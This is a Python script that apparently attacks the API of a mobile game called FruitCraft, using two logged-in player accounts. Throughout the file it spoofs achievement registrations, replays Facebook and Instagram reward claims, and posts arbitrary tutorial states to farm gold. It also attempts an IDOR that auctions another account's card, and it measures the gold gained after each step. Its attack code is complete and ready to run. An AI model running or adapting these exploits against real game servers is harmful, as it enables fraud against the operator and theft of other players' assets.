import sys, os
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def get_gold(client):
    d = client.get_profile()
    if d and "data" in d:
        return d["data"].get("gold", 0)
    return 0

def test_achievements(c1):
    print("\n--- 1. Testing Achievement Spoofing ---")
    start_gold = get_gold(c1)
    print(f"Starting Gold: {start_gold}")
    
    # Try a few common achievement IDs (1 to 10)
    success_count = 0
    for ach_id in range(1, 11):
        res = c1.post("/player/registerachievement", {"achievement_id": ach_id})
        if res and res.get("status"):
            success_count += 1
        time.sleep(1)
        
    end_gold = get_gold(c1)
    print(f"Achievements registered: {success_count}/10")
    print(f"Final Gold: {end_gold} | Gained: {end_gold - start_gold}")

def test_social_rewards(c1):
    print("\n--- 2. Testing Social Reward Replay ---")
    start_gold = get_gold(c1)
    
    # Claim FB
    res_fb = c1.post("/player/claimfbreward", {})
    print("FB Reward:", res_fb.get("status") if res_fb else res_fb)
    time.sleep(1)
    
    # Claim IG
    res_ig = c1.post("/player/claiminstagramreward", {})
    print("IG Reward:", res_ig.get("status") if res_ig else res_ig)
    time.sleep(1)
    
    end_gold = get_gold(c1)
    print(f"Gold Gained: {end_gold - start_gold}")

def test_tutorial_spoofing(c1):
    print("\n--- 3. Testing Tutorial Spoofing ---")
    start_gold = get_gold(c1)
    
    for state in [100, 500, 1000, 8300, 9999]:
        res = c1.post("/player/tutorial", {"tutorial_id": state})
        time.sleep(1)
        
    end_gold = get_gold(c1)
    print(f"Gold Gained from Tutorial Steps: {end_gold - start_gold}")

def test_auction_idor(c1, c2_card_id):
    print("\n--- 4. Testing Auction Creation IDOR ---")
    payload = {"card_id": c2_card_id, "start_price": 100, "duration": 12}
    res = c1.post("/auction/setcardforauction", payload)
    print("Auction IDOR response:", res)

def main():
    c1 = FruitClient()
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    if not s1: return
    
    c2 = FruitClient()
    s2, d2 = c2.login("skirt11437fire14", "android_vuln_t2")
    if not s2: return
    
    c2_cards = d2.get("data", {}).get("cards", [])
    c2_card_id = c2_cards[0]["id"] if c2_cards else 0
    
    test_achievements(c1)
    test_social_rewards(c1)
    test_tutorial_spoofing(c1)
    
    if c2_card_id:
        test_auction_idor(c1, c2_card_id)

if __name__ == "__main__":
    main()
